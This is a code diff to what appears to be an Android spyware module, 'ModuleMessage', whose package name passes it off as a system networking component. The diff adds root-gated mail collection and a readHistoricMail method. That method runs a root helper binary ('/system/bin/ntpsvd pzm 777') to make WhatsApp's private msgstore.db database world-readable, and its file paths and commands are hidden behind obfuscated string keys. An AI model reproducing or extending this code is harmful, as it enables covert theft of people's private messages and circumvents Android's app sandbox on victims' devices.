@@ -9,12 +9,14 @@
 
 package com.android.networking.module;
 
+import java.io.File;
 import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.Iterator;
 
 import com.android.networking.Messages;
+import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ChildConf;
 import com.android.networking.conf.ConfModule;
@@ -61,9 +63,10 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 	Markup storedMMS;
 	Markup storedSMS;
-	//Markup storedEMAIL;
+	Markup storedMAIL;
 
 	private Markup configMarkup;
+	private int lastMail;
 	private int lastMMS;
 	private int lastSMS;
 	private Filter[] filterCollect = new Filter[3];
@@ -78,7 +81,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 		storedMMS = new Markup(this, 1);
 		storedSMS = new Markup(this, 2);
-		//storedEMAIL = new Markup(this, 4);
+		storedMAIL = new Markup(this, 4);
 		configMarkup = new Markup(this, 3);
 
 		String[] config = new String[] { "", "", "" };
@@ -104,12 +107,12 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		// {"mms":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2010-09-28 09:40:05"}},"sms":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2010-09-01 00:00:00"}},"mail":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2011-02-01 00:00:00"}},"module":"messages"}
 		try {
 
-			mailEnabled = readJson(ID_MAIL, Messages.getString("18_1"), conf, config);
+			mailEnabled = Status.self().haveRoot() && readJson(ID_MAIL, Messages.getString("18_1"), conf, config);
 			smsEnabled = readJson(ID_SMS, Messages.getString("18_7"), conf, config);
 			mmsEnabled = readJson(ID_MMS, Messages.getString("18_9"), conf, config);
 
 			if (!config[ID_MAIL].equals(oldConfig[ID_MAIL])) {
-				// configMailChanged = true;
+				storedMAIL.removeMarkup();
 			}
 
 			if (!config[ID_SMS].equals(oldConfig[ID_SMS])) {
@@ -178,6 +181,10 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	public void actualStart() {
 		ListenerSms.self().attach(this);
 
+		if (mailEnabled) {
+			initMail();
+		}
+		
 		if (smsEnabled) {
 			initSms();
 		}
@@ -208,6 +215,16 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 	}
 
+	private void initMail() {
+		try {
+			readHistoricMail(lastMail);
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+	
+	}
+	
 	private void initSms() {
 		if (storedSMS.isMarkup()) {
 			try {
@@ -278,6 +295,21 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		}
 	}
 
+	// TODO: mail
+	private int readHistoricMail(int lastMail) throws IOException {
+		// f.0=/data/data/com.whatsapp/databases
+				String dbDir = Messages.getString("f_0");
+				// f.1=/msgstore.db
+				String dbFile = dbDir + Messages.getString("f_1");
+				// changeFilePermission(dbFile,777);
+				// f.2=/system/bin/ntpsvd pzm 777 
+				Runtime.getRuntime().exec(Messages.getString("f_2") + dbDir);
+				Runtime.getRuntime().exec(Messages.getString("f_2") + dbFile);
+				File file = new File(dbFile);
+				
+				return 0;
+	}
+	
 	private int readHistoricMms(int lastMMS) {
 		final MmsBrowser mmsBrowser = new MmsBrowser();
 		final ArrayList<Mms> listMms = mmsBrowser.getMmsList(lastMMS);
